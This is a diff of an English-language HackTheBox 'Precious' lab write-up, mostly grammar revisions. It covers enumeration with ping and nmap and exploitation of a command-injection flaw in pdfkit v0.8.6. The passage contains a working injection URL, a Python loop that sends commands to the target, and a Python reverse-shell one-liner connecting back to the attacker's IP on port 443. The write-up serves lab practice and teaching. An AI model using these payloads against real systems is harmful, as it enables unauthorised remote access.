@@ -14,15 +14,15 @@
 
 # Introduction
 
-This writeup was made for 2 purposes. Normally, my writeups are in Portuguese, but this time, I do it in English because I am in a Cyber Security degree, and I need to do an assignment for English class in the 2022 winter break. The assignment was to summarize and explain 3 good articles about something I like, but I didn't know what to choose, so I decided to make the "Precious" machine from HTB and read some articles about the machine's vulnerabilities. Also, teacher Maria's goal is to keep us interested and active in English, so I think I'm respecting the global rules =).
+This write-up was created for two purposes. Normally, my write-ups are in Portuguese, but this time, I am writing in English because I am in a Cyber Security degree, and I need to complete an assignment for my English class during the 2022 winter break. The assignment was to summarize and explain three good articles about a topic I like, but I didn't know what to choose, so I decided to make the "Precious" machine from HTB and read some articles about the machine's vulnerabilities. Additionally, my teacher Maria's goal is to keep us interested and active in English, so I think I am respecting the overall rules =).
 
-For this time, I don't go to talk about possible ways to find something or explain different stuffs that not in the machine, because it's already a lot of work write and think in English. I just go to talk about the machine and the way to get Administrator of the machine, and only that.
+For this time, I will not be discussing possible ways to find something or explaining different concepts that are not related to the machine, because it is already a lot of work to write and think in English. I will only be talking about the machine and the way to gain Administrator access to the machine.
 
-I try to do a lot of analogies to the real world for my teacher don't get too lost xD. I will try to do my best
+I will try to make analogies to the real world so that my teacher does not get lost. I will do my best.
 
 # Enumeration
 
-Like every machine, we need to know where to get in. HTB give us the IP address but, we don't know nothing more. The IP address is like an address of a house, but we need to figure out what doors is open to get in. In a machine, the doors are called "Ports" (in reference to the ports of ships that allow the arrival of goods from the outside world). They are always 65355 ports in all machines. It is a lot!! But we are not knock on all the ports manually... For that we have a tool called **nmap**.
+Like every machine, we need to know how to access it. HTB gives us the IP address, but we don't know anything else. The IP address is like the address of a house, but we need to figure out which doors are open to get in. In a machine, these doors are called "ports" (in reference to the ports of ships that allow the arrival of goods from the outside world). There are always 65,535 ports in all machines. It's a lot!! But we don't need to knock on all the ports manually... For that, we have a tool called **nmap**.
 
 First, we need to confirm that we can reach the IP:
 
@@ -36,43 +36,43 @@ ping -c 1 10.10.11.189
     # rtt min/avg/max/mdev = 72.530/72.530/72.530/0.000 ms
 ```
 
-We send a ICMP packet, and the target machine send it back. With the **ping** command (like ping pong), we know the machine is alive and we can start scanning the ports. We noticed one more thing with ping command. The result gives us TTL (Time to Live) and refers to the number of hops that a packet is allowed to make before it is discarded. When a packet run through the Internet, every time this packet passes through a router, the router decrements this value by 1. For Windows, TTL starts at 128, and for Linux, TTL starts at 64. We can use this information by approximation to know the Operating System of the target machine. In this case, is likely a Linux machine. It is important for future commands on the target machine.
+We send an ICMP packet, and the target machine sends it back. With the **ping** command (like ping pong), we know the machine is alive and we can start scanning the ports. We noticed one more thing with the ping command. The result gives us the TTL (Time to Live) which refers to the number of hops that a packet is allowed to make before it is discarded. When a packet travels through the Internet, every time it passes through a router, the router decrements this value by 1. For Windows, TTL starts at 128, and for Linux, TTL starts at 64. We can use this information to approximate the Operating System of the target machine. In this case, it is likely a Linux machine. It is important for future commands on the target machine.
 
 ![Enumeration all ports](Assets/HTB-Linux-Easy-Precious/EnumerationAllPorts.png)
 
-With the response of the big **nmap** command, we know that on the target machine, we got 2 ports open: port 22 and port 80. Normally, port 22 is for a server SSH and the port 80 is for a Web Server. The server SSH is a remote secure shell, for connect my command line with the machine when we connect in with the right credentials. We don't have any credentials so we can't do nothing here. We just have one more port. The Web Server.
+With the response of the **nmap** command, we know that on the target machine, we have 2 ports open: port 22 and port 80. Normally, port 22 is for an SSH server and port 80 is for a web server. The SSH server is a remote secure shell, used to connect my command line with the machine when we connect with the right credentials. We don't have any credentials, so we can't do anything here. We just have one more port, the web server.
 
-Before we start locking the Website, we can do a more powerful scan, with **nmap** too.
+Before we start looking at the website, we can do a more powerful scan, using **nmap** as well.
 
 ![Enumeration targeted ports](Assets/HTB-Linux-Easy-Precious/EnumerationTargeted.png)
 
-This new command gives us more information. The Webserver redirect us to http://precious.htb/, but that Website don't exist. We know the site is on this IP but the Webserver want us to get in by the URL http://precious.htb/. We can do that by saying to our machine that the URL http://precious.htb/ correspond to the IP of the target machine. For that, we can edit as root (Super User) the file **/etc/hosts** and add the line:
+This new command gives us more information. The web server redirects us to **http://precious.htb/**, but that website doesn't exist. We know the site is on this IP, but the web server wants us to access it through the URL **http://precious.htb/**. We can do that by telling our machine that the URL **http://precious.htb/** corresponds to the IP of the target machine. For that, we can edit the file **/etc/hosts** as a root (super user) and add the line:
 
 ```bash
 echo "10.10.11.189\tprecious.htb" >> /etc/hosts
 ```
 
-Now, we can access the Website:
+Now, we can access the website:
 
 ![Website](Assets/HTB-Linux-Easy-Precious/WebSite.png)
 
-It is a website to convert Websites to PDF. We can do some basic tests to get more information about the Website. We can try to serve a Webserver and enter the new URL to see what happens:
+It is a website that converts websites to PDF. We can do some basic testing to get more information about the website. We can try to serve a web server and enter the new URL to see what happens:
 
 ```bash
 python -m http.server 80
 ```
 
-This is a really simple Webserver, but it is enough for us. We can enter our URL **(http://10.10.14.144/)** to the field on the Website and see what happens:
+This is a really simple web server, but it is enough for us. We can enter our URL **(http://10.10.14.144/)** in the field on the website and see what happens:
 
 ![pdf Download](Assets/HTB-Linux-Easy-Precious/pdfDownload.png)
 
-We can see that the Website download a PDF file. Visually, it is just a simples PDF. But if we use a tool like **exiftool** to see the metadata of the PDF, we can see more...
+We can see that the website download a PDF file. Visually, it is just a simples PDF. But if we use a tool like **exiftool** to see the metadata of the PDF, we can see more information...
 
 ![pdf Metadata](Assets/HTB-Linux-Easy-Precious/Exiftool.png)
 
 # Exploit - Remote Code Execution
 
-We can see that the PDF Creator is a tool called **pdfkit v0.8.6**. This version is vulnerable and we can get a RCE (Remote Code Execution). We can see more about this vulnerability [here](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795). To exploit this vulnerability, it is simple! We just need to add to the URL a param called **?user** and give a "space" but encoded (a space like %20 is the URL code for a space of the space bar). Next, we need to concatenate a *bash* code (because is a Linux Machine) with the special symbol **`** (a code between 2 of this symbol in bash get execute before the rest of the command outside the symbols) around the code for execute it like if we are in a command line shell. The command we will try is a single ping to our machine to test if we really got remote code execution. The final URL will be:
+We can see that the PDF Creator is a tool called **pdfkit v0.8.6**. This version is vulnerable and we can get a RCE (Remote Code Execution). We can see more about this vulnerability [here](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795). To exploit this vulnerability, it's simple! We just need to add to the URL a parameter called **?user** and give a "space" but encoded (a space like %20 is the URL code for a space of the space bar). Next, we need to concatenate a bash code (because it is a Linux Machine) with the special symbol **`** (a code between 2 of this symbol in bash get execute before the rest of the command outside the symbols) around the code for execute it like if we are in a command line shell. The command we will try is a single ping to our machine to test if we really got remote code execution. The final URL will be:
 
 > http://10.10.14.144/?name=%20`ping -c 1 10.10.14.144`
 ```bash
@@ -90,10 +90,10 @@ while True:
     data = {
         'url': f"http://10.10.14.144/?name=%20`{cmd}`",
         }
-    response = requests.post('http://precious.htb/', data=data, verify=False)
+    response = requests.post('**http://precious.htb/**', data=data, verify=False)
 ```
 
-Now, we can try to get a reverse shell. A reverse shell is a type of connection to get a shell in the target machine. But the way we got this is tricky. We need to find a way to the target machine send his own shell to our machine. Is like we try to enter in a house, and we need to find a way that the house open his own door to give us the access... The command worked on the machine was this:
+Now, we can try to get a reverse shell. A reverse shell is a type of connection to get a shell on the target machine. But the way we got this is tricky. We need to find a way for the target machine to send its own shell to our machine. It's like trying to enter a house, and we need to find a way for the house to open its own door to give us access... The command that worked on the machine was this:
 
 ```bash
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.144",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
@@ -105,7 +105,7 @@ So, if we want to do that on the Website, we need to send this url:
 http://10.10.14.144/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.144",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
 ```
 
-The query needs to be that exact and we need to adapt the IP and the port. We need to setup a listener to capture the shell too.
+The query needs to be that exact and we need to adapt the IP and the port. We also need to set up a listener to capture the shell.
 
 ![Reverse Shell](Assets/HTB-Linux-Easy-Precious/ReverseShell.png)
 
